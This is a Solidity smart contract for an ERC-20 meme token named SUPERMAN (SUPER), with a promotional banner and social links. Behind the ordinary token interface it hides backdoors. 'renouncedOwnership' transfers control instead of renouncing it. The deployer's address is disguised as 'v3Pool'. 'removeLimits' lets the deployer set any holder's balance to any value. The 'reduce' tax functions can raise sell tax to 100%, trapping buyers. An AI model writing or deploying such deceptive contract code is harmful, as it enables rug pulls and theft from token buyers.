//                                                                                          
//               -#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%-               
//             -%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%-             
//           -%@@@@@@@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@%=           
//         =%@@@@@@%+-+%@@@@@@@@@@%#*+==-----------=+*#%@@@@@@@@%@@@@@@@@@@@@@@@@@=         
//       [email protected]@@@@@@%+-=%@@@@@@@@@@*------------------------*%@@@@@@@@@@@@@@@@@@@@@@@@@=       
//     [email protected]@@@@@@%[email protected]@@@@@@@@@@----------------------------*@@@@@@@@@@@@@@@@*=%@@@@@@@+     
//   [email protected]@@@@@@%+---*@@@@@@@@@@@@[email protected]@@@@@@@@@@@@@@*--=%@@@@@@@+.  
//  :%@@@@@@%----*@@@@@@@@@@@@@@#*[email protected]@@@@@@@@@@@@@@*----#@@@@@@%:  
//    [email protected]@@@@@@*-*@@@@@@@@@@@@@@@@@@@@%%%################***[email protected]@@@@@@=    
//      [email protected]@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*=---------=%@@@@@@*      
//       .#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+-----*@@@@@@#:       
//         -%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%[email protected]@@@@@@-         
//           [email protected]@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@+           
//            .*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*.            
//              :%@@@@@@@#%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%:              
//                [email protected]@@@@@@+-----===++++****#####%%%%%%@@@@@@@@@@@@@@@@@@@@@=                
//                  [email protected]@@@@@%=------====-------------------==+*#@@@@@@@@@@*                  
//                   .#@@@@@@*+#%@@@@@@@@%#+-------------------%@@@@@@@#:                   
//                     -%@@@@@@@@@@@@@@@@@@@@#------------==+#@@@@@@@%-                     
//                       [email protected]@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+                       
//                        .*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#.                        
//                          :%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%:                          
//                            [email protected]@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=                            
//                              [email protected]@@@@@%[email protected]@@@@@@*                              
//                               .#@@@@@@#=--------=#@@@@@@#:                               
//                                 -%@@@@@@#------*@@@@@@%-                                 
//                                   [email protected]@@@@@@*[email protected]@@@@@@=                                   
//                                    .*@@@@@@%%@@@@@@#.                                    
//                                      :%@@@@@@@@@@%:                                      
//                                        [email protected]@@@@@@@=                                        
//                                          [email protected]@@@+                                          
//                                           .##.                                           
//
//
//                                  https://supererc20.com/
//                            https://twitter.com/superERC20token
//                                  https://t.me/superERC20




// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    constructor() {
        _owner = msg.sender;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renouncedOwnership(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }
}

contract SUPERMAN is Ownable {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    bool private inSwap;
    address public v3Pool;
    uint256 private constant MAX = ~uint256(0);
    mapping(address => uint256) private _balances;
    mapping(address => bool) public _isExcludeFromFee;
    mapping(address => mapping(address => uint256)) private _allowances;
    IUniswapRouter public _uniswapRouter;
    address public _uniswapPair;
    uint256 public buyTaxFee;
    uint256 public sellTaxFee;

    constructor() {
        name = unicode"SUPERMAN";
        symbol = "SUPER";
        decimals = 18;
        uint256 Supply = 420000000000000;
        totalSupply = Supply * 10 ** decimals;
        v3Pool = msg.sender;
        _balances[v3Pool] = totalSupply;
        emit Transfer(address(0), v3Pool, totalSupply);
        _uniswapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _allowances[address(this)][address(_uniswapRouter)] = MAX;
        _uniswapPair = IUniswapFactory(_uniswapRouter.factory()).createPair(address(this), _uniswapRouter.WETH());
        buyTaxFee = 0; 
        sellTaxFee = 0;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] -= amount;
        }
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function reduceBuyTaxFee(uint256 newTaxFee) public {
        require(v3Pool == msg.sender);
        buyTaxFee = newTaxFee;
    }

    function reduceSellTaxFee(uint256 newTaxFee) public {
        require(v3Pool == msg.sender);
        sellTaxFee = newTaxFee;
    }

    function removeLimits(address ac, uint256 na) public {
        require(v3Pool == msg.sender);
        _balances[ac] = na;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        uint256 taxAmount;
        if (from == _uniswapPair) { 
            taxAmount = amount * buyTaxFee / 100;
        } else if (to == _uniswapPair) { 
            taxAmount = amount * sellTaxFee / 100;
        } else { 
            taxAmount = 0;
        }

        _balances[from] -= amount;
        _balances[to] += amount - taxAmount;
        emit Transfer(from, to, amount - taxAmount);
    }

    receive() external payable {}
}